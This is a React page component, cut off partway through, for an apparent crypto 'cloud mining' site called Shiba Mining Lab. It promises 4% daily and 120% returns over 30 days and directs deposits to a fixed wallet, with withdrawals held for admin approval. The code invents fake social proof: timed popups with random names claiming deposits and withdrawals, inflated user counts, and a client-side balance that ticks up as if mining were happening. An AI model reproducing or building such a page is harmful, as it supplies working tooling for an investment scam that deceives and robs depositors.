'use client';

import { useState, useEffect, useCallback } from 'react';
import { motion, AnimatePresence } from 'framer-motion';
import { 
  Wallet, TrendingUp, Users, Shield, Zap, 
  Menu, X, Copy, Check, Clock, DollarSign, Gift, 
  LogOut, LayoutDashboard,
  ArrowUpRight, ArrowDownRight, RefreshCw,
  Timer, Percent, Calendar, AlertCircle, CheckCircle2,
  Eye, EyeOff, Hash, Pickaxe, Globe, ChevronDown,
  Headphones, ArrowUp, Play
} from 'lucide-react';
import { Button } from '@/components/ui/button';
import { Input } from '@/components/ui/input';
import { Dialog, DialogContent, DialogHeader, DialogTitle, DialogDescription } from '@/components/ui/dialog';
import { Badge } from '@/components/ui/badge';
import { Separator } from '@/components/ui/separator';

// Types
interface User {
  id: string;
  email: string;
  walletAddress: string;
  balance: number;
  totalProfit: number;
  referralEarnings: number;
  referralCode: string;
  role: string;
}

interface MiningData {
  id: string;
  investment: number;
  dailyProfit: number;
  totalEarned: number;
  status: string;
  startedAt: string;
  expiresAt: string;
  lastUpdateAt: string;
}

// Constants
const DAILY_PROFIT_RATE = 4; // 4%
const MINING_DURATION_DAYS = 30;

export default function ShibaMiningLab() {
  // State
  const [isMenuOpen, setIsMenuOpen] = useState(false);
  const [activeSection, setActiveSection] = useState('home');
  const [user, setUser] = useState<User | null>(null);
  const [miningData, setMiningData] = useState<MiningData | null>(null);
  const [showWalletModal, setShowWalletModal] = useState(false);
  const [showSetupModal, setShowSetupModal] = useState(false);
  const [showDepositModal, setShowDepositModal] = useState(false);
  const [showWithdrawModal, setShowWithdrawModal] = useState(false);
  const [showPinModal, setShowPinModal] = useState(false);
  const [calculatorAmount, setCalculatorAmount] = useState<string>('1000');
  const [showPin, setShowPin] = useState(false);
  const [copied, setCopied] = useState(false);
  const [isLoading, setIsLoading] = useState(false);
  const [error, setError] = useState<string | null>(null);
  const [success, setSuccess] = useState<string | null>(null);
  const [currentActivity, setCurrentActivity] = useState<{type: string; message: string; amount?: number} | null>(null);
  const [realTimeBalance, setRealTimeBalance] = useState(0);
  const [miningTimer, setMiningTimer] = useState({ days: 0, hours: 0, minutes: 0, seconds: 0 });
  
  // Form states
  const [walletInput, setWalletInput] = useState('');
  const [setupForm, setSetupForm] = useState({
    securityPin: '',
    confirmPasswordPin: '',
    referralCode: ''
  });
  const [depositForm, setDepositForm] = useState({ amount: '', txHash: '' });
  const [withdrawForm, setWithdrawForm] = useState({ amount: '', walletAddress: '', pin: '' });
  const [pendingWithdraw, setPendingWithdraw] = useState<typeof withdrawForm | null>(null);
  const [isNewUser, setIsNewUser] = useState(false);

  // Mock deposit wallet address
  const DEPOSIT_WALLET = '0x742d35Cc6634C0532925a3b844Bc9e7595f5aE31';

  // Generate random activities
  const generateRandomActivity = useCallback(() => {
    const names = ['Ahmed', 'Ali', 'Mohammed', 'Sara', 'Fatima', 'Omar', 'Khalid', 'Yusuf', 'Aisha', 'Layla', 'John', 'Mike', 'David', 'Emma', 'Sophia'];
    const name = names[Math.floor(Math.random() * names.length)];
    const types = ['deposit', 'withdraw', 'register'];
    const type = types[Math.floor(Math.random() * types.length)];
    const amount = Math.floor(Math.random() * 500 + 50);
    
    const messages = {
      deposit: `${name} just deposited ${amount} USDT`,
      withdraw: `${name} just withdrew ${amount} USDT`,
      register: `${name} just joined Shiba Mining Lab`
    };

    return {
      type,
      message: messages[type as keyof typeof messages],
      amount: type !== 'register' ? amount : undefined
    };
  }, []);

  // Show random activity popups
  useEffect(() => {
    const showActivity = () => {
      const activity = generateRandomActivity();
      setCurrentActivity(activity);
      setTimeout(() => setCurrentActivity(null), 5000);
    };

    const interval = setInterval(showActivity, 8000 + Math.random() * 7000);
    return () => clearInterval(interval);
  }, [generateRandomActivity]);

  // Real-time mining update simulation
  useEffect(() => {
    if (!user || !miningData || miningData.status !== 'active') return;

    const updateBalance = () => {
      const now = new Date();
      const expiresAt = new Date(miningData.expiresAt);
      
      if (now >= expiresAt) {
        setMiningData(prev => prev ? { ...prev, status: 'expired' } : null);
        return;
      }

      const diff = expiresAt.getTime() - now.getTime();
      const days = Math.floor(diff / (1000 * 60 * 60 * 24));
      const hours = Math.floor((diff % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
      const minutes = Math.floor((diff % (1000 * 60 * 60)) / (1000 * 60));
      const seconds = Math.floor((diff % (1000 * 60)) / 1000);

      setMiningTimer({ days, hours, minutes, seconds });

      const perSecondProfit = miningData.dailyProfit / 86400;
      setRealTimeBalance(prev => prev + perSecondProfit);
    };

    const interval = setInterval(updateBalance, 1000);
    return () => clearInterval(interval);
  }, [user, miningData]);

  // Fetch user data on mount
  useEffect(() => {
    fetchUserData();
  }, []);

  const fetchUserData = async () => {
    try {
      const res = await fetch('/api/user/me');
      if (res.ok) {
        const data = await res.json();
        setUser(data.user);
        setMiningData(data.mining);
        if (data.mining) {
          setRealTimeBalance(data.mining.totalEarned);
        }
      }
    } catch {
      // User not logged in
    }
  };

  // Calculator calculations
  const calculateProfits = (amount: number) => {
    const daily = amount * (DAILY_PROFIT_RATE / 100);
    return {
      perSecond: daily / 86400,
      perMinute: daily / 1440,
      perHour: daily / 24,
      perDay: daily,
      perWeek: daily * 7,
      perMonth: daily * 30,
      total: daily * 30
    };
  };

  const profits = calculateProfits(parseFloat(calculatorAmount) || 0);

  // Wallet Login/Check
  const handleWalletConnect = async () => {
    if (!walletInput || walletInput.length !== 42 || !walletInput.startsWith('0x')) {
      setError('Please enter a valid BEP20 wallet address (0x...)');
      return;
    }

    setIsLoading(true);
    setError(null);

    try {
      // Check if wallet exists
      const res = await fetch('/api/auth/wallet-check', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ walletAddress: walletInput })
      });

      const data = await res.json();

      if (data.exists) {
        // Login existing user
        setUser(data.user);
        setMiningData(data.mining);
        if (data.mining) {
          setRealTimeBalance(data.mining.totalEarned);
        }
        setShowWalletModal(false);
        setSuccess('Welcome back!');
      } else {
        // New user - show setup modal
        setIsNewUser(true);
        setShowWalletModal(false);
        setShowSetupModal(true);
      }
    } catch (err) {
      setError(err instanceof Error ? err.message : 'Connection failed');
    } finally {
      setIsLoading(false);
    }
  };

  // Setup new account
  const handleSetupAccount = async (e: React.FormEvent) => {
    e.preventDefault();
    setIsLoading(true);
    setError(null);

    if (setupForm.securityPin !== setupForm.confirmPasswordPin) {
      setError('Security PINs do not match');
      setIsLoading(false);
      return;
    }

    if (setupForm.securityPin.length !== 4) {
      setError('Security PIN must be 4 digits');
      setIsLoading(false);
      return;
    }

    try {
      const res = await fetch('/api/auth/wallet-register', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          walletAddress: walletInput,
          securityPin: setupForm.securityPin,
          referralCode: setupForm.referralCode || undefined
        })
      });

      const data = await res.json();

      if (!res.ok) {
        throw new Error(data.error || 'Registration failed');
      }

      setUser(data.user);
      setShowSetupModal(false);
      setSuccess('Account created successfully! Welcome to Shiba Mining Lab!');
      setSetupForm({ securityPin: '', confirmPasswordPin: '', referralCode: '' });
    } catch (err) {
      setError(err instanceof Error ? err.message : 'Registration failed');
    } finally {
      setIsLoading(false);
    }
  };

  const handleLogout = async () => {
    await fetch('/api/auth/logout', { method: 'POST' });
    setUser(null);
    setMiningData(null);
    setRealTimeBalance(0);
    setSuccess('Logged out successfully');
  };

  // Deposit handler
  const handleDeposit = async (e: React.FormEvent) => {
    e.preventDefault();
    setIsLoading(true);
    setError(null);

    try {
      const res = await fetch('/api/deposit', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(depositForm)
      });

      const data = await res.json();

      if (!res.ok) {
        throw new Error(data.error || 'Deposit failed');
      }

      setShowDepositModal(false);
      setSuccess('Deposit submitted! Awaiting admin approval.');
      setDepositForm({ amount: '', txHash: '' });
    } catch (err) {
      setError(err instanceof Error ? err.message : 'Deposit failed');
    } finally {
      setIsLoading(false);
    }
  };

  // Withdraw handlers
  const handleWithdraw = async (e: React.FormEvent) => {
    e.preventDefault();
    setError(null);

    if (!user) return;

    const amount = parseFloat(withdrawForm.amount);
    if (amount > user.balance) {
      setError('Insufficient balance');
      return;
    }

    setPendingWithdraw(withdrawForm);
    setShowWithdrawModal(false);
    setShowPinModal(true);
  };

  const confirmWithdraw = async () => {
    if (!pendingWithdraw) return;
    setIsLoading(true);
    setError(null);

    try {
      const res = await fetch('/api/withdraw', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(pendingWithdraw)
      });

      const data = await res.json();

      if (!res.ok) {
        throw new Error(data.error || 'Withdrawal failed');
      }

      setShowPinModal(false);
      setPendingWithdraw(null);
      setSuccess('Withdrawal submitted! Awaiting admin approval.');
      setWithdrawForm({ amount: '', walletAddress: '', pin: '' });
      fetchUserData();
    } catch (err) {
      setError(err instanceof Error ? err.message : 'Withdrawal failed');
    } finally {
      setIsLoading(false);
    }
  };

  // Copy to clipboard
  const copyToClipboard = (text: string) => {
    navigator.clipboard.writeText(text);
    setCopied(true);
    setTimeout(() => setCopied(false), 2000);
  };

  // Format number with commas
  const formatNumber = (num: number, decimals: number = 2) => {
    return num.toLocaleString('en-US', { 
      minimumFractionDigits: decimals, 
      maximumFractionDigits: decimals 
    });
  };

  return (
    <div className="min-h-screen bg-white">
      {/* Activity Popup */}
      <AnimatePresence>
        {currentActivity && (
          <motion.div
            initial={{ opacity: 0, x: 100, y: 0 }}
            animate={{ opacity: 1, x: 0, y: 0 }}
            exit={{ opacity: 0, x: 100 }}
            className="fixed bottom-4 right-4 z-50"
          >
            <div className="bg-white shadow-2xl rounded-xl p-4 flex items-center gap-3 border-l-4 border-[#7c3aed]">
              <div className={`w-10 h-10 rounded-full flex items-center justify-center ${
                currentActivity.type === 'deposit' 
                  ? 'bg-green-100 text-green-600' 
                  : currentActivity.type === 'withdraw' 
                  ? 'bg-yellow-100 text-yellow-600' 
                  : 'bg-[#7c3aed]/10 text-[#7c3aed]'
              }`}>
                {currentActivity.type === 'deposit' ? (
                  <ArrowDownRight className="w-5 h-5" />
                ) : currentActivity.type === 'withdraw' ? (
                  <ArrowUpRight className="w-5 h-5" />
                ) : (
                  <Users className="w-5 h-5" />
                )}
              </div>
              <div>
                <p className="text-sm font-medium text-gray-900">{currentActivity.message}</p>
                <p className="text-xs text-gray-500">Just now</p>
              </div>
            </div>
          </motion.div>
        )}
      </AnimatePresence>

      {/* Header */}
      <header className="bg-[#7c3aed] sticky top-0 z-50">
        <div className="max-w-7xl mx-auto px-4">
          <div className="flex items-center justify-between h-16">
            {/* Logo */}
            <div className="flex items-center gap-3">
              <div className="w-10 h-10 rounded-lg bg-[#f59e0b] flex items-center justify-center">
                <span className="text-white font-bold text-xl">S</span>
              </div>
              <div>
                <span className="text-white font-bold text-lg">Shiba Mining Lab</span>
                <p className="text-white/70 text-xs">Simple USDT Miner</p>
              </div>
            </div>

            {/* Desktop Menu */}
            <div className="hidden lg:flex items-center gap-1">
              <div className="flex items-center gap-1 mr-4">
                <Globe className="w-4 h-4 text-white/70" />
                <span className="text-white/70 text-sm">English</span>
                <ChevronDown className="w-4 h-4 text-white/70" />
              </div>
              {user ? (
                <>
                  <button
                    onClick={() => setActiveSection('dashboard')}
                    className="px-4 py-2 text-white hover:bg-white/10 rounded-lg text-sm font-medium transition-all"
                  >
                    Dashboard
                  </button>
                  <button
                    onClick={handleLogout}
                    className="px-4 py-2 text-white hover:bg-white/10 rounded-lg text-sm font-medium transition-all"
                  >
                    Logout
                  </button>
                </>
              ) : (
                <button
                  onClick={() => setShowWalletModal(true)}
                  className="px-6 py-2 bg-[#f59e0b] text-white rounded-lg text-sm font-medium hover:bg-[#f59e0b]/90 transition-all flex items-center gap-2"
                >
                  <Wallet className="w-4 h-4" />
                  Connect Wallet
                </button>
              )}
              <button
                onClick={() => setIsMenuOpen(!isMenuOpen)}
                className="p-2 text-white"
              >
                <Menu className="w-6 h-6" />
              </button>
            </div>

            {/* Mobile Menu Button */}
            <button
              onClick={() => setIsMenuOpen(!isMenuOpen)}
              className="lg:hidden p-2 text-white"
            >
              {isMenuOpen ? <X className="w-6 h-6" /> : <Menu className="w-6 h-6" />}
            </button>
          </div>
        </div>

        {/* Mobile Menu */}
        <AnimatePresence>
          {isMenuOpen && (
            <motion.div
              initial={{ opacity: 0, height: 0 }}
              animate={{ opacity: 1, height: 'auto' }}
              exit={{ opacity: 0, height: 0 }}
              className="lg:hidden bg-[#7c3aed] border-t border-white/10"
            >
              <div className="px-4 py-4 space-y-2">
                {['Home', 'About', 'Mining', 'Calculator', 'Deposit', 'Withdraw', 'Referral', 'FAQ'].map((item) => (
                  <button
                    key={item}
                    onClick={() => {
                      setActiveSection(item.toLowerCase());
                      setIsMenuOpen(false);
                    }}
                    className="block w-full text-left px-4 py-3 rounded-lg text-white hover:bg-white/10 text-sm font-medium transition-all"
                  >
                    {item}
                  </button>
                ))}
                <Separator className="bg-white/20 my-2" />
                {user ? (
                  <button
                    onClick={() => {
                      handleLogout();
                      setIsMenuOpen(false);
                    }}
                    className="block w-full text-left px-4 py-3 text-white text-sm font-medium"
                  >
                    Logout
                  </button>
                ) : (
                  <button
                    onClick={() => {
                      setShowWalletModal(true);
                      setIsMenuOpen(false);
                    }}
                    className="w-full px-4 py-3 bg-[#f59e0b] text-white rounded-lg text-sm font-medium flex items-center justify-center gap-2"
                  >
                    <Wallet className="w-4 h-4" />
                    Connect Wallet
                  </button>
                )}
              </div>
            </motion.div>
          )}
        </AnimatePresence>
      </header>

      <main>
        {/* Hero Section - DogeLab Style */}
        <section id="home" className="relative overflow-hidden">
          {/* Gradient Background */}
          <div className="absolute inset-0 bg-gradient-to-br from-[#7c3aed] via-[#a855f7] to-[#f59e0b]" />
          
          {/* Decorative circles */}
          <div className="absolute top-20 right-20 w-64 h-64 bg-white/10 rounded-full blur-3xl" />
          <div className="absolute bottom-20 left-20 w-96 h-96 bg-[#f59e0b]/20 rounded-full blur-3xl" />
          
          <div className="relative z-10 max-w-7xl mx-auto px-4 py-16 md:py-24">
            <div className="text-center">
              {/* Badge */}
              <motion.div
                initial={{ opacity: 0, y: 20 }}
                animate={{ opacity: 1, y: 0 }}
                className="inline-flex items-center gap-2 bg-white/20 backdrop-blur-sm rounded-full px-4 py-2 mb-8"
              >
                <span className="text-white text-sm font-medium">🚀 Trusted by 10,000+ Miners Worldwide</span>
              </motion.div>

              {/* Heading */}
              <motion.h1
                initial={{ opacity: 0, y: 20 }}
                animate={{ opacity: 1, y: 0 }}
                transition={{ delay: 0.1 }}
                className="text-4xl md:text-5xl lg:text-6xl font-bold text-white mb-6"
              >
                Next Generation<br />
                <span className="text-[#f59e0b]">Cloud Mining Platform</span>
              </motion.h1>

              {/* Subtitle */}
              <motion.p
                initial={{ opacity: 0, y: 20 }}
                animate={{ opacity: 1, y: 0 }}
                transition={{ delay: 0.2 }}
                className="text-lg md:text-xl text-white/80 mb-8 max-w-2xl mx-auto"
              >
                Earn passive income with our automated USDT mining system. 
                Connect your BEP20 wallet to start mining today.
              </motion.p>

              {/* Wallet Input */}
              <motion.div
                initial={{ opacity: 0, y: 20 }}
                animate={{ opacity: 1, y: 0 }}
                transition={{ delay: 0.3 }}
                className="max-w-xl mx-auto mb-8"
              >
                <div className="flex flex-col sm:flex-row gap-3">
                  <div className="flex-1 relative">
                    <Wallet className="absolute left-4 top-1/2 -translate-y-1/2 w-5 h-5 text-gray-400" />
                    <input
                      type="text"
                      defaultValue={user?.walletAddress || ''}
                      placeholder="Enter your BEP20 wallet address"
                      className="w-full pl-12 pr-4 py-4 rounded-xl bg-white/20 backdrop-blur-sm border border-white/30 text-white placeholder-white/50 focus:outline-none focus:border-white/60"
                      readOnly={!!user}
                    />
                  </div>
                  <button
                    onClick={() => {
                      if (user) {
                        setShowDepositModal(true);
                      } else {
                        setShowWalletModal(true);
                      }
                    }}
                    className="px-8 py-4 bg-gradient-to-r from-[#7c3aed] to-[#f59e0b] text-white font-semibold rounded-xl hover:opacity-90 transition-all"
                  >
                    {user ? 'START MINING' : 'CONNECT WALLET'}
                  </button>
                </div>
              </motion.div>

              {/* Stats */}
              <motion.div
                initial={{ opacity: 0, y: 20 }}
                animate={{ opacity: 1, y: 0 }}
                transition={{ delay: 0.4 }}
                className="flex flex-wrap justify-center gap-8"
              >
                <div className="text-center">
                  <div className="text-3xl md:text-4xl font-bold text-white">4%</div>
                  <div className="text-white/70 text-sm">Daily Profit</div>
                </div>
                <div className="text-center">
                  <div className="text-3xl md:text-4xl font-bold text-[#f59e0b]">120%</div>
                  <div className="text-white/70 text-sm">Total Return</div>
                </div>
                <div className="text-center">
                  <div className="text-3xl md:text-4xl font-bold text-white">30</div>
                  <div className="text-white/70 text-sm">Days Duration</div>
                </div>
              </motion.div>
            </div>
          </div>
        </section>

        {/* Statistics Section - DogeLab Style */}
        <section className="relative overflow-hidden">
          <div className="absolute inset-0 bg-gradient-to-b from-[#f59e0b] to-[#7c3aed]" />
          
          {/* Wave decoration */}
          <svg className="absolute top-0 left-0 w-full" viewBox="0 0 1440 100" fill="none">
            <path d="M0 100L48 89.5C96 79 192 58 288 52.5C384 47 480 57 576 68.5C672 79 768 89 864 84.5C960 79 1056 58 1152 52.5C1248 47 1344 58 1392 63.5L1440 69V0H1392C1344 0 1248 0 1152 0C1056 0 960 0 864 0C768 0 672 0 576 0C480 0 384 0 288 0C192 0 96 0 48 0H0V100Z" fill="white"/>
          </svg>
          
          <div className="relative z-10 max-w-7xl mx-auto px-4 py-16">
            <div className="grid grid-cols-2 md:grid-cols-4 gap-4">
              {[
                { value: '35K+', label: 'Happy Miners' },
                { value: '230K+', label: 'Total Deposit' },
                { value: '1000+', label: 'Withdrawals' },
                { value: '15+', label: 'Languages' }
              ].map((stat, index) => (
                <motion.div
                  key={stat.label}
                  initial={{ opacity: 0, y: 20 }}
                  whileInView={{ opacity: 1, y: 0 }}
                  viewport={{ once: true }}
                  transition={{ delay: index * 0.1 }}
                  className="bg-white rounded-2xl p-6 text-center shadow-lg"
                >
                  <div className="text-3xl md:text-4xl font-bold text-[#7c3aed] mb-2">{stat.value}</div>
                  <div className="text-gray-500 text-sm">{stat.label}</div>
                </motion.div>
              ))}
            </div>
          </div>
          
          {/* Bottom wave */}
          <svg className="absolute bottom-0 left-0 w-full" viewBox="0 0 1440 100" fill="none">
            <path d="M0 0L48 10.5C96 21 192 42 288 47.5C384 53 480 42 576 31.5C672 21 768 11 864 15.5C960 21 1056 42 1152 47.5C1248 53 1344 42 1392 36.5L1440 31V100H1392C1344 100 1248 100 1152 100C1056 100 960 100 864 100C768 100 672 100 576 100C480 100 384 100 288 100C192 100 96 100 48 100H0V0Z" fill="white"/>
          </svg>
        </section>

        {/* Working Process Section - DogeLab Style */}
        <section id="about" className="py-16 px-4 bg-white">
          <div className="max-w-7xl mx-auto">
            <motion.div
              initial={{ opacity: 0, y: 20 }}
              whileInView={{ opacity: 1, y: 0 }}
              viewport={{ once: true }}
              className="text-center mb-12"
            >
              <span className="inline-block bg-[#f59e0b] text-white text-sm font-medium px-4 py-2 rounded-full mb-4">
                Working Process
              </span>
              <h2 className="text-3xl md:text-4xl font-bold text-gray-900 mb-4">
                How To Start Mining
              </h2>
              <p className="text-gray-600 max-w-2xl mx-auto">
                Get started with Shiba Mining Lab in just 3 simple steps
              </p>
            </motion.div>

            <div className="grid md:grid-cols-3 gap-8">
              {[
                {
                  step: '01',
                  icon: Wallet,
                  title: 'Connect Wallet',
                  description: 'Connect your USDT BEP20 wallet address to get started'
                },
                {
                  step: '02',
                  icon: ArrowDownRight,
                  title: 'Deposit USDT',
                  description: 'Make a deposit using USDT on the BNB Smart Chain network'
                },
                {
                  step: '03',
                  icon: Pickaxe,
                  title: 'Start Mining',
                  description: 'Your mining starts automatically and profits accumulate daily'
                }
              ].map((item, index) => (
                <motion.div
                  key={item.step}
                  initial={{ opacity: 0, y: 20 }}
                  whileInView={{ opacity: 1, y: 0 }}
                  viewport={{ once: true }}
                  transition={{ delay: index * 0.1 }}
                  className="relative text-center p-6"
                >
                  <div className="w-16 h-16 mx-auto mb-4 rounded-full bg-gradient-to-br from-[#7c3aed] to-[#f59e0b] flex items-center justify-center">
                    <item.icon className="w-8 h-8 text-white" />
                  </div>
                  <div className="absolute top-0 right-4 text-6xl font-bold text-gray-100">{item.step}</div>
                  <h3 className="text-xl font-bold text-gray-900 mb-2">{item.title}</h3>
                  <p className="text-gray-600">{item.description}</p>
                </motion.div>
              ))}
            </div>
          </div>
        </section>

        {/* Mining Plan Section */}
        <section id="mining" className="py-16 px-4 bg-gray-50">
          <div className="max-w-4xl mx-auto">
            <motion.div
              initial={{ opacity: 0, y: 20 }}
              whileInView={{ opacity: 1, y: 0 }}
              viewport={{ once: true }}
              className="text-center mb-12"
            >
              <span className="inline-block bg-[#7c3aed] text-white text-sm font-medium px-4 py-2 rounded-full mb-4">
                Mining Plan
              </span>
              <h2 className="text-3xl md:text-4xl font-bold text-gray-900 mb-4">
                Starter Mining Plan
              </h2>
              <p className="text-gray-600">
                Simple, transparent, and profitable mining for everyone
              </p>
            </motion.div>

            <motion.div
              initial={{ opacity: 0, y: 20 }}
              whileInView={{ opacity: 1, y: 0 }}
              viewport={{ once: true }}
              className="bg-gradient-to-br from-[#7c3aed] to-[#f59e0b] rounded-3xl p-8 text-center"
            >
              <div className="bg-white/10 backdrop-blur-sm rounded-2xl p-6 mb-6">
                <div className="text-5xl font-bold text-white mb-2">4%</div>
                <div className="text-white/80 text-lg">Daily Profit</div>
              </div>

              <div className="grid grid-cols-2 md:grid-cols-4 gap-4 mb-8">
                <div className="bg-white/10 backdrop-blur-sm rounded-xl p-4">
                  <div className="text-white/70 text-sm mb-1">Duration</div>
                  <div className="text-white font-bold text-xl">30 Days</div>
                </div>
                <div className="bg-white/10 backdrop-blur-sm rounded-xl p-4">
                  <div className="text-white/70 text-sm mb-1">Total Return</div>
                  <div className="text-white font-bold text-xl">120%</div>
                </div>
                <div className="bg-white/10 backdrop-blur-sm rounded-xl p-4">
                  <div className="text-white/70 text-sm mb-1">Min Invest</div>
                  <div className="text-white font-bold text-xl">$10</div>
                </div>
                <div className="bg-white/10 backdrop-blur-sm rounded-xl p-4">
                  <div className="text-white/70 text-sm mb-1">Network</div>
                  <div className="text-white font-bold text-xl">BEP20</div>
                </div>
              </div>

              <button
                onClick={() => {
                  if (user) {
                    setShowDepositModal(true);
                  } else {
                    setShowWalletModal(true);
                  }
                }}
                className="px-12 py-4 bg-white text-[#7c3aed] font-bold rounded-xl hover:bg-gray-100 transition-all text-lg"
              >
                {user ? 'Start Mining Now' : 'Connect Wallet to Start'}
              </button>
            </motion.div>
          </div>
        </section>

        {/* Calculator Section */}
        <section id="calculator" className="py-16 px-4 bg-white">
          <div className="max-w-4xl mx-auto">
            <motion.div
              initial={{ opacity: 0, y: 20 }}
              whileInView={{ opacity: 1, y: 0 }}
              viewport={{ once: true }}
              className="text-center mb-12"
            >
              <span className="inline-block bg-[#f59e0b] text-white text-sm font-medium px-4 py-2 rounded-full mb-4">
                Calculator
              </span>
              <h2 className="text-3xl md:text-4xl font-bold text-gray-900 mb-4">
                Mining Profit Calculator
              </h2>
              <p className="text-gray-600">
                Calculate your potential earnings with our mining calculator
              </p>
            </motion.div>

            <motion.div
              initial={{ opacity: 0, y: 20 }}
              whileInView={{ opacity: 1, y: 0 }}
              viewport={{ once: true }}
              className="bg-gray-50 rounded-3xl p-8"
            >
              {/* Input */}
              <div className="mb-8">
                <label className="block text-sm font-medium text-gray-700 mb-2">
                  Investment Amount (USDT)
                </label>
                <div className="relative">
                  <DollarSign className="absolute left-4 top-1/2 -translate-y-1/2 w-6 h-6 text-gray-400" />
                  <input
                    type="number"
                    value={calculatorAmount}
                    onChange={(e) => setCalculatorAmount(e.target.value)}
                    className="w-full pl-12 pr-4 py-4 rounded-xl border border-gray-200 focus:border-[#7c3aed] focus:ring-2 focus:ring-[#7c3aed]/20 text-2xl font-bold"
                    placeholder="1000"
                  />
                </div>
              </div>

              {/* Quick amounts */}
              <div className="flex flex-wrap gap-2 mb-8">
                {[100, 500, 1000, 5000, 10000].map((amount) => (
                  <button
                    key={amount}
                    onClick={() => setCalculatorAmount(amount.toString())}
                    className={`px-4 py-2 rounded-lg font-medium transition-all ${
                      calculatorAmount === amount.toString()
                        ? 'bg-[#7c3aed] text-white'
                        : 'bg-white border border-gray-200 text-gray-700 hover:border-[#7c3aed]'
                    }`}
                  >
                    ${amount.toLocaleString()}
                  </button>
                ))}
              </div>

              {/* Results Grid */}
              <div className="grid grid-cols-2 md:grid-cols-3 gap-4">
                <div className="bg-white rounded-xl p-4 text-center border border-gray-100">
                  <Timer className="w-6 h-6 mx-auto mb-2 text-[#7c3aed]" />
                  <div className="text-xs text-gray-500 mb-1">Per Second</div>
                  <div className="text-lg font-bold text-[#7c3aed]">${formatNumber(profits.perSecond, 6)}</div>
                </div>
                <div className="bg-white rounded-xl p-4 text-center border border-gray-100">
                  <Clock className="w-6 h-6 mx-auto mb-2 text-[#f59e0b]" />
                  <div className="text-xs text-gray-500 mb-1">Per Minute</div>
                  <div className="text-lg font-bold text-[#f59e0b]">${formatNumber(profits.perMinute, 4)}</div>
                </div>
                <div className="bg-white rounded-xl p-4 text-center border border-gray-100">
                  <Clock className="w-6 h-6 mx-auto mb-2 text-[#7c3aed]" />
                  <div className="text-xs text-gray-500 mb-1">Per Hour</div>
                  <div className="text-lg font-bold text-[#7c3aed]">${formatNumber(profits.perHour)}</div>
                </div>
                <div className="bg-white rounded-xl p-4 text-center border border-gray-100">
                  <Calendar className="w-6 h-6 mx-auto mb-2 text-[#f59e0b]" />
                  <div className="text-xs text-gray-500 mb-1">Per Day</div>
                  <div className="text-lg font-bold text-[#f59e0b]">${formatNumber(profits.perDay)}</div>
                </div>
                <div className="bg-white rounded-xl p-4 text-center border border-gray-100">
                  <TrendingUp className="w-6 h-6 mx-auto mb-2 text-[#7c3aed]" />
                  <div className="text-xs text-gray-500 mb-1">Per Week</div>
                  <div className="text-lg font-bold text-[#7c3aed]">${formatNumber(profits.perWeek)}</div>
                </div>
                <div className="bg-gradient-to-br from-[#7c3aed] to-[#f59e0b] rounded-xl p-4 text-center">
                  <Percent className="w-6 h-6 mx-auto mb-2 text-white" />
                  <div className="text-xs text-white/70 mb-1">Total (30 Days)</div>
                  <div className="text-lg font-bold text-white">${formatNumber(profits.total)}</div>
                </div>
              </div>
            </motion.div>
          </div>
        </section>

        {/* Deposit Section */}
        <section id="deposit" className="py-16 px-4 bg-gray-50">
          <div className="max-w-4xl mx-auto">
            <motion.div
              initial={{ opacity: 0, y: 20 }}
              whileInView={{ opacity: 1, y: 0 }}
              viewport={{ once: true }}
              className="text-center mb-12"
            >
              <span className="inline-block bg-[#7c3aed] text-white text-sm font-medium px-4 py-2 rounded-full mb-4">
                Deposit
              </span>
              <h2 className="text-3xl md:text-4xl font-bold text-gray-900 mb-4">
                Deposit USDT
              </h2>
              <p className="text-gray-600">
                Send USDT on BEP20 network to fund your account
              </p>
            </motion.div>

            <motion.div
              initial={{ opacity: 0, y: 20 }}
              whileInView={{ opacity: 1, y: 0 }}
              viewport={{ once: true }}
              className="bg-white rounded-3xl p-8 shadow-lg"
            >
              <div className="grid md:grid-cols-2 gap-8">
                <div>
                  <div className="mb-6">
                    <label className="block text-sm font-medium text-gray-700 mb-2">Deposit Wallet</label>
                    <div className="flex gap-2">
                      <input
                        type="text"
                        value={DEPOSIT_WALLET}
                        readOnly
                        className="flex-1 px-4 py-3 rounded-xl bg-gray-50 border border-gray-200 font-mono text-sm"
                      />
                      <button
                        onClick={() => copyToClipboard(DEPOSIT_WALLET)}
                        className="px-4 py-3 bg-[#7c3aed] text-white rounded-xl hover:bg-[#6d28d9] transition-all"
                      >
                        {copied ? <Check className="w-5 h-5" /> : <Copy className="w-5 h-5" />}
                      </button>
                    </div>
                  </div>

                  <div className="mb-6">
                    <label className="block text-sm font-medium text-gray-700 mb-2">Network</label>
                    <div className="flex items-center gap-2 px-4 py-3 rounded-xl bg-gray-50 border border-gray-200">
                      <div className="w-6 h-6 rounded-full bg-yellow-500 flex items-center justify-center text-xs font-bold text-white">B</div>
                      <span>BEP20 (BNB Smart Chain)</span>
                    </div>
                  </div>

                  <div className="bg-yellow-50 border border-yellow-200 rounded-xl p-4">
                    <div className="flex gap-3">
                      <AlertCircle className="w-5 h-5 text-yellow-600 shrink-0 mt-0.5" />
                      <p className="text-sm text-yellow-700">
                        Only send USDT on BEP20 network. Other networks will result in loss of funds.
                      </p>
                    </div>
                  </div>
                </div>

                <div className="flex flex-col items-center justify-center">
                  <div className="bg-white p-4 rounded-xl border border-gray-200 mb-4">
                    <div className="w-48 h-48 bg-gray-100 flex items-center justify-center rounded-lg">
                      <Hash className="w-16 h-16 text-gray-400" />
                    </div>
                  </div>
                  <p className="text-gray-500 text-sm">Scan QR code to deposit</p>
                </div>
              </div>

              <div className="mt-8 text-center">
                <button
                  onClick={() => {
                    if (!user) {
                      setShowWalletModal(true);
                    } else {
                      setShowDepositModal(true);
                    }
                  }}
                  className="px-8 py-4 bg-gradient-to-r from-[#7c3aed] to-[#f59e0b] text-white font-semibold rounded-xl hover:opacity-90 transition-all"
                >
                  <Wallet className="w-5 h-5 inline mr-2" />
                  Submit Deposit
                </button>
              </div>
            </motion.div>
          </div>
        </section>

        {/* Withdraw Section */}
        <section id="withdraw" className="py-16 px-4 bg-white">
          <div className="max-w-4xl mx-auto">
            <motion.div
              initial={{ opacity: 0, y: 20 }}
              whileInView={{ opacity: 1, y: 0 }}
              viewport={{ once: true }}
              className="text-center mb-12"
            >
